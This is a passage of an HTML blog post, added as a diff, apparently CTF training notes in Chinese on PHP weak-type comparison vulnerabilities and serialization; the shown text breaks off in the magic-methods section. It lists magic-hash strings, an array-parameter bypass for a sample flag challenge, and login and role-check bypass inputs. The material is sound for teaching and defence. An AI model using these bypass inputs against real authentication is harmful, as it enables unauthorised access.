@@ -1,0 +1,2429 @@
+<!DOCTYPE html>
+<html lang="en-us" dir="ltr">
+    <head><meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="真是熬夜爆肝啊，不说了睡觉去了😪">
+<title>1.24-2 弱类型比较漏洞及序列化与反序列化</title>
+
+<link rel='canonical' href='https://www.retr0.xyz/p/1.24-2-%E5%BC%B1%E7%B1%BB%E5%9E%8B%E6%AF%94%E8%BE%83%E6%BC%8F%E6%B4%9E%E5%8F%8A%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/'>
+
+<link rel="stylesheet" href="/scss/style.min.67c2cdd23260c968137443c657d1f7a9a3df6cb47c832d8909e5b1c8880a7e9c.css"><meta property='og:title' content="1.24-2 弱类型比较漏洞及序列化与反序列化">
+<meta property='og:description' content="真是熬夜爆肝啊，不说了睡觉去了😪">
+<meta property='og:url' content='https://www.retr0.xyz/p/1.24-2-%E5%BC%B1%E7%B1%BB%E5%9E%8B%E6%AF%94%E8%BE%83%E6%BC%8F%E6%B4%9E%E5%8F%8A%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/'>
+<meta property='og:site_name' content='Retr0的小窝'>
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:published_time' content='2026-01-25T00:50:33&#43;08:00'/><meta property='article:modified_time' content='2026-01-25T00:50:33&#43;08:00'/>
+<meta name="twitter:title" content="1.24-2 弱类型比较漏洞及序列化与反序列化">
+<meta name="twitter:description" content="真是熬夜爆肝啊，不说了睡觉去了😪">
+    <link rel="shortcut icon" href="/favicon.ico" />
+
+        <link rel="stylesheet" href="/css/APlayer.min.css">
+        <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.16.9/dist/katex.min.css">
+        <script src="https://cdn.jsdelivr.net/npm/katex@0.16.9/dist/katex.min.js"></script>
+        <script src="https://cdn.jsdelivr.net/npm/katex@0.16.9/dist/contrib/auto-render.min.js"></script>
+    </head>
+    <body class="
+    article-page
+    ">
+    <script>
+        (function() {
+            const colorSchemeKey = 'StackColorScheme';
+            if(!localStorage.getItem(colorSchemeKey)){
+                localStorage.setItem(colorSchemeKey, "auto");
+            }
+        })();
+    </script><script>
+    (function() {
+        const colorSchemeKey = 'StackColorScheme';
+        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
+        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
+
+        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
+            
+
+            document.documentElement.dataset.scheme = 'dark';
+        } else {
+            document.documentElement.dataset.scheme = 'light';
+        }
+    })();
+</script>
+<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky ">
+    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="切换菜单">
+        <span class="hamburger-box">
+            <span class="hamburger-inner"></span>
+        </span>
+    </button>
+
+    <header>
+        
+            
+            <figure class="site-avatar">
+                <a href="/">
+                
+                    
+                    
+                    
+                        
+                        <img src="/img/avatar_hu_918ed7c4aecb3d05.gif" width="300"
+                            height="300" class="site-logo" loading="lazy" alt="Avatar">
+                    
+                
+                </a>
+                
+                    <span class="emoji">🥳</span>
+                
+            </figure>
+            
+        
+        
+        <div class="site-meta">
+            <h1 class="site-name"><a href="/">Retr0的小窝</a></h1>
+            <h2 class="site-description">我们安全了……暂时的</h2>
+        </div>
+    </header><ol class="menu-social">
+            
+                <li>
+                    <a 
+                        href='https://space.bilibili.com/349466985'
+                        target="_blank"
+                        title="Bilibili"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-tabler icons-tabler-outline icon-tabler-brand-bilibili"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M3 10a4 4 0 0 1 4 -4h10a4 4 0 0 1 4 4v6a4 4 0 0 1 -4 4h-10a4 4 0 0 1 -4 -4v-6z" /><path d="M8 3l2 3" /><path d="M16 3l-2 3" /><path d="M9 13v-2" /><path d="M15 11v2" /></svg>
+                        
+                    </a>
+                </li>
+            
+                <li>
+                    <a 
+                        href='mailto:ded000@retr0.xyz'
+                        target="_blank"
+                        title="email"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-tabler icons-tabler-outline icon-tabler-mail"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M3 7a2 2 0 0 1 2 -2h14a2 2 0 0 1 2 2v10a2 2 0 0 1 -2 2h-14a2 2 0 0 1 -2 -2v-10z" /><path d="M3 7l9 6l9 -6" /></svg>
+                        
+                    </a>
+                </li>
+            
+                <li>
+                    <a 
+                        href='https://github.com/makabaka11'
+                        target="_blank"
+                        title="GitHub"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5" />
+</svg>
+
+
+
+                        
+                    </a>
+                </li>
+            
+                <li>
+                    <a 
+                        href='https://www.retr0.xyz/index.xml'
+                        target="_blank"
+                        title="RSS"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-tabler icons-tabler-outline icon-tabler-rss"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M5 19m-1 0a1 1 0 1 0 2 0a1 1 0 1 0 -2 0" /><path d="M4 4a16 16 0 0 1 16 16" /><path d="M4 11a9 9 0 0 1 9 9" /></svg>
+                        
+                    </a>
+                </li>
+            
+                <li>
+                    <a 
+                        href='https://t.me/ded0000'
+                        target="_blank"
+                        title="Telegram"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-tabler icons-tabler-outline icon-tabler-brand-telegram"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M15 10l-4 4l6 6l4 -16l-18 7l4 2l2 6l3 -4" /></svg>
+                        
+                    </a>
+                </li>
+            
+        </ol><ol class="menu" id="main-menu">
+        
+        
+        
+        <li >
+            <a href='/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <polyline points="5 12 3 12 12 3 21 12 19 12" />
+  <path d="M5 12v7a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-7" />
+  <path d="M9 21v-6a2 2 0 0 1 2 -2h2a2 2 0 0 1 2 2v6" />
+</svg>
+
+
+
+                
+                <span>主页 | Home</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/%E5%85%B3%E4%BA%8E-about/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="7" r="4" />
+  <path d="M6 21v-2a4 4 0 0 1 4 -4h4a4 4 0 0 1 4 4v2" />
+</svg>
+
+
+
+                
+                <span>关于 | About</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/archives/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <rect x="3" y="4" width="18" height="4" rx="2" />
+  <path d="M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-10" />
+  <line x1="10" y1="12" x2="14" y2="12" />
+</svg>
+
+
+
+                
+                <span>归档 | Archives</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/message/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-tabler icons-tabler-outline icon-tabler-message"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M8 9h8" /><path d="M8 13h6" /><path d="M18 4a3 3 0 0 1 3 3v8a3 3 0 0 1 -3 3h-5l-5 3v-3h-2a3 3 0 0 1 -3 -3v-8a3 3 0 0 1 3 -3h12z" /></svg>
+                
+                <span>留言板 | Msg Board</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/search/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="10" cy="10" r="7" />
+  <line x1="21" y1="21" x2="15" y2="15" />
+</svg>
+
+
+
+                
+                <span>搜索 | Search</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/%E6%8A%80%E6%9C%AF%E9%93%BE%E6%8E%A5-links/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M10 14a3.5 3.5 0 0 0 5 0l4 -4a3.5 3.5 0 0 0 -5 -5l-.5 .5" />
+  <path d="M14 10a3.5 3.5 0 0 0 -5 0l-4 4a3.5 3.5 0 0 0 5 5l.5 -.5" />
+</svg>
+
+
+
+                
+                <span>技术链接 | Links</span>
+            </a>
+        </li>
+        
+        <li class="menu-bottom-section">
+            <ol class="menu">
+
+                
+                    <li id="dark-mode-toggle">
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="8" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="16" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <span>暗色模式</span>
+                    </li>
+                
+            </ol>
+        </li>
+    </ol>
+</aside>
+
+    <aside class="sidebar right-sidebar sticky">
+        
+            
+                
+    <section class="widget archives">
+        <div class="widget-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <line x1="5" y1="9" x2="19" y2="9" />
+  <line x1="5" y1="15" x2="19" y2="15" />
+  <line x1="11" y1="4" x2="7" y2="20" />
+  <line x1="17" y1="4" x2="13" y2="20" />
+</svg>
+
+
+
+        </div>
+        <h2 class="widget-title section-title">目录</h2>
+        
+        <div class="widget--toc">
+            <nav id="TableOfContents">
+  <ol>
+    <li><a href="#弱类型比较漏洞">弱类型比较漏洞</a>
+      <ol>
+        <li><a href="#原理介绍">原理介绍</a>
+          <ol>
+            <li><a href="#字符串-vs-数字比较">字符串 vs 数字比较</a></li>
+            <li><a href="#布尔值-vs-其他值比较">布尔值 vs 其他值比较</a></li>
+            <li><a href="#重点哈希值-vs-字符串-0-比较">重点：哈希值 vs 字符串 “0” 比较</a></li>
+          </ol>
+        </li>
+        <li><a href="#利用方法">利用方法</a></li>
+      </ol>
+    </li>
+    <li><a href="#序列化与反序列化">序列化与反序列化</a>
+      <ol>
+        <li><a href="#前置知识php的面向对象">前置知识：php的面向对象</a>
+          <ol>
+            <li><a href="#语法示例类和对象的定义">语法示例：类和对象的定义</a></li>
+            <li><a href="#魔术方法">魔术方法</a></li>
+          </ol>
+        </li>
+        <li><a href="#关于面向对象的补充">关于面向对象的补充</a></li>
+        <li><a href="#序列化">序列化</a></li>
+        <li><a href="#反序列化">反序列化</a></li>
+        <li><a href="#漏洞利用">漏洞利用</a></li>
+        <li><a href="#小练习">小练习</a></li>
+      </ol>
+    </li>
+    <li><a href="#其他漏洞">其他漏洞</a>
+      <ol>
+        <li><a href="#extract">extract()</a>
+          <ol>
+            <li><a href="#例题">例题</a></li>
+          </ol>
+        </li>
+        <li><a href="#正则表达式和strpos">正则表达式和strpos()</a></li>
+      </ol>
+    </li>
+  </ol>
+</nav>
+        </div>
+    </section>
+
+            
+        
+    </aside>
+
+
+            <main class="main full-width">
+    <article class="main-article">
+    <header class="article-header">
+
+    <div class="article-details">
+    
+    <header class="article-category">
+        
+            <a href="/categories/%E7%BD%91%E5%AE%89/" style="background-color: #BEBDBD; color: #fff;">
+                网安
+            </a>
+        
+            <a href="/categories/26%E5%AF%92%E5%81%87%E9%9B%86%E8%AE%AD/" >
+                26寒假集训
+            </a>
+        
+    </header>
+    
+
+    <div class="article-title-wrapper">
+        <h2 class="article-title">
+            <a href="/p/1.24-2-%E5%BC%B1%E7%B1%BB%E5%9E%8B%E6%AF%94%E8%BE%83%E6%BC%8F%E6%B4%9E%E5%8F%8A%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">1.24-2 弱类型比较漏洞及序列化与反序列化</a>
+        </h2>
+    
+        
+        <h3 class="article-subtitle">
+            真是熬夜爆肝啊，不说了睡觉去了😪
+        </h3>
+        
+    </div>
+
+    
+    
+     
+    
+    <footer class="article-time">
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
+  <circle cx="18" cy="18" r="4" />
+  <path d="M15 3v4" />
+  <path d="M7 3v4" />
+  <path d="M3 11h16" />
+  <path d="M18 16.496v1.504l1 1" />
+</svg>
+                <time class="article-time--published">2026-01-25</time>
+            </div>
+        
+
+        
+
+        
+        <div id="viewCount">
+            <svg  xmlns="http://www.w3.org/2000/svg"  width="24"  height="24"  viewBox="0 0 24 24"  fill="none"  stroke="currentColor"  stroke-width="2"  stroke-linecap="round"  stroke-linejoin="round"  class="icon icon-tabler icons-tabler-outline icon-tabler-eye"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M10 12a2 2 0 1 0 4 0a2 2 0 0 0 -4 0" /><path d="M21 12c-2.4 4 -5.4 6 -9 6c-3.6 0 -6.6 -2 -9 -6c2.4 -4 5.4 -6 9 -6c3.6 0 6.6 2 9 6" /></svg>
+            <time class="article-time--reading">
+                <span id="vercount_value_page_pv">loading... </span>次
+            </time>
+        </div>
+    </footer>
+    
+
+    
+</div>
+</header>
+
+    <section class="article-content">
+    
+    
+    <h2 id="弱类型比较漏洞">弱类型比较漏洞
+</h2><blockquote>
+<p>弱类型比较漏洞是 PHP 语言特有的逻辑漏洞，根源在于 <strong>弱等于运算符（</strong><code>==</code><strong>）</strong> 的特性：比较时不严格校验数据类型，会先自动将两侧数据转换为相同类型，再进行值比较，最终导致预期外的 “相等” 结果，可能被攻击者利用绕过认证、权限校验等关键逻辑。</p>
+</blockquote>
+<h3 id="原理介绍">原理介绍
+</h3><h4 id="字符串-vs-数字比较">字符串 vs 数字比较
+</h4><ul>
+<li><strong>转换规则</strong>：PHP 会将字符串强制转换为数字，转换逻辑为：取字符串开头的数字部分（若开头非数字则转换为 0），忽略后续非数字字符。</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="s1">&#39;12&#39;</span> <span class="o">==</span> <span class="mi">12</span><span class="p">;</span>        <span class="c1">// true（字符串&#34;12&#34;转数字12，值相等）
+</span></span></span><span class="line"><span class="cl"><span class="s1">&#39;12abc&#39;</span> <span class="o">==</span> <span class="mi">12</span><span class="p">;</span>     <span class="c1">// true（仅取开头数字12，忽略&#34;abc&#34;）
+</span></span></span><span class="line"><span class="cl"><span class="s1">&#39;adm2n&#39;</span> <span class="o">==</span> <span class="mi">0</span><span class="p">;</span>      <span class="c1">// true（字符串开头非数字，转换为0）
+</span></span></span><span class="line"><span class="cl"><span class="s1">&#39;0123&#39;</span> <span class="o">==</span> <span class="mi">123</span><span class="p">;</span>     <span class="c1">// true（前导0不影响数字转换结果）
+</span></span></span><span class="line"><span class="cl"><span class="s1">&#39;abc123&#39;</span> <span class="o">==</span> <span class="mi">0</span><span class="p">;</span>     <span class="c1">// true（开头无数字，转0）
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><h4 id="布尔值-vs-其他值比较">布尔值 vs 其他值比较
+</h4><ul>
+<li><strong>转换规则</strong>：布尔值<code>true</code>与任意非 0 值（含非空字符串、非 0 数字）相等；布尔值<code>false</code>仅与 0、空字符串等 “空值” 相等。</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="s1">&#39;way&#39;</span> <span class="o">==</span> <span class="k">true</span><span class="p">;</span>     <span class="c1">// true（非空字符串转布尔值true）
+</span></span></span><span class="line"><span class="cl"><span class="s1">&#39;false&#39;</span> <span class="o">==</span> <span class="k">true</span><span class="p">;</span>   <span class="c1">// true（字符串&#34;false&#34;非空，转true）
+</span></span></span><span class="line"><span class="cl"><span class="mi">234</span> <span class="o">==</span> <span class="k">true</span><span class="p">;</span>       <span class="c1">// true（非0数字转true）
+</span></span></span><span class="line"><span class="cl"><span class="mi">0</span> <span class="o">==</span> <span class="k">false</span><span class="p">;</span>        <span class="c1">// true（0转false）
+</span></span></span><span class="line"><span class="cl"><span class="s1">&#39;&#39;</span> <span class="o">==</span> <span class="k">false</span><span class="p">;</span>       <span class="c1">// true（空字符串转false）
+</span></span></span><span class="line"><span class="cl"><span class="s1">&#39;0&#39;</span> <span class="o">==</span> <span class="k">false</span><span class="p">;</span>      <span class="c1">// true（字符串&#34;0&#34;转数字0，再转false）
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><h4 id="重点哈希值-vs-字符串-0-比较">重点：哈希值 vs 字符串 “0” 比较
+</h4><ul>
+<li><strong>转换规则</strong>：若哈希值（如 md5、sha1 结果）以<code>0e</code>开头，且后续字符全为数字，PHP 会将其当作 <strong>科学计数法（0 的任意次幂 = 0）</strong> 处理，与字符串 “0” 或数字 0 比较时结果为 true。</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nv">$str1</span> <span class="o">=</span> <span class="s1">&#39;240610708&#39;</span><span class="p">;</span>  <span class="c1">// md5($str1) = &#39;0e420233178946742799316739797882&#39;
+</span></span></span><span class="line"><span class="cl"><span class="nx">md5</span><span class="p">(</span><span class="nv">$str1</span><span class="p">)</span> <span class="o">==</span> <span class="s1">&#39;0&#39;</span><span class="p">;</span>    <span class="c1">// true（哈希值以0e开头，按科学计数法解析为0）
+</span></span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nv">$str2</span> <span class="o">=</span> <span class="s1">&#39;QNKCDZO&#39;</span><span class="p">;</span>    <span class="c1">// md5($str2) = &#39;0e830400451993494058024219903391&#39;
+</span></span></span><span class="line"><span class="cl"><span class="nx">md5</span><span class="p">(</span><span class="nv">$str2</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">;</span>      <span class="c1">// true（同理，解析为0）
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><ol start="4">
+<li><strong>md5加密数组输出为NULL</strong></li>
+</ol>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;username&#39;</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;password&#39;</span><span class="p">])</span> <span class="p">){</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;username&#39;</span> <span class="p">]</span> <span class="o">==</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;password&#39;</span><span class="p">]){</span>
+</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="s1">&#39;false&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span><span class="k">else</span> <span class="k">if</span><span class="p">(</span><span class="nx">md5</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;username&#39;</span><span class="p">])</span> <span class="o">===</span> <span class="nx">md5</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;password&#39;</span><span class="p">])){</span>
+</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="s1">&#39;flag is xxxxx&#39;</span> <span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span><span class="k">else</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="s1">&#39;nonono&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>想要得到flag就必须传入参数使得username和password都是数组，这样可以使他们本身不弱相等的情况下MD5值又强相等（因为没有值）。</p>
+<p>传参：<code>?username[]=1&amp;password[]=2</code></p>
+<h3 id="利用方法">利用方法
+</h3><ol>
+<li><strong>登录认证绕过</strong>：若后台用<code>$_POST['password'] == $correct_pwd</code>校验，可构造<code>password=12</code>绕过<code>$correct_pwd=&quot;12abc&quot;</code>的校验。</li>
+<li><strong>哈希校验绕过</strong>：若用<code>md5($input) == $admin_md5</code>验证，可输入<code>240610708</code>（其 md5 以 0e 开头），绕过<code>$admin_md5=&quot;0&quot;</code>的校验。</li>
+<li><strong>权限逻辑绕过</strong>：若用<code>$role == 1</code>（1 为管理员角色），可输入<code>role=1abc</code>，因转换为 1 导致权限提升。</li>
+</ol>
+<h2 id="序列化与反序列化">序列化与反序列化
+</h2><h3 id="前置知识php的面向对象">前置知识：php的面向对象
+</h3><h4 id="语法示例类和对象的定义">语法示例：类和对象的定义
+</h4><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">People</span><span class="p">{</span>   <span class="c1">//定义类
+</span></span></span><span class="line"><span class="cl">    <span class="c1">//成员变量
+</span></span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$name</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$age</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$job</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="c1">//成员方法
+</span></span></span><span class="line"><span class="cl">    <span class="k">function</span> <span class="nf">speak</span><span class="p">(){</span>
+</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="s1">&#39;hello，我叫&#39;</span><span class="o">.</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">name</span><span class="o">.</span><span class="s1">&#39;，年龄&#39;</span><span class="o">.</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">age</span><span class="o">.</span><span class="s1">&#39;，我是一个&#39;</span><span class="o">.</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">job</span><span class="o">.</span><span class="s1">&#39;&lt;/br&gt;&#39;</span><span class="p">;</span>   <span class="c1">//$this可类比python中的self，旨在访问当前类中的变量
+</span></span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$c1</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">People</span><span class="p">();</span>	<span class="c1">//初始化对象
+</span></span></span><span class="line"><span class="cl"><span class="nv">$c1</span><span class="o">-&gt;</span><span class="na">name</span> <span class="o">=</span> <span class="s1">&#39;小明&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$c1</span><span class="o">-&gt;</span><span class="na">age</span> <span class="o">=</span> <span class="mi">18</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$c1</span><span class="o">-&gt;</span><span class="na">job</span> <span class="o">=</span> <span class="s1">&#39;学生&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$c1</span><span class="o">-&gt;</span><span class="na">speak</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><h4 id="魔术方法">魔术方法
+</h4><ol>
+<li>构造函数<code>__construct()</code></li>
+</ol>
+<p>它在调用这个类初始化了一个对象时会自动执行。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
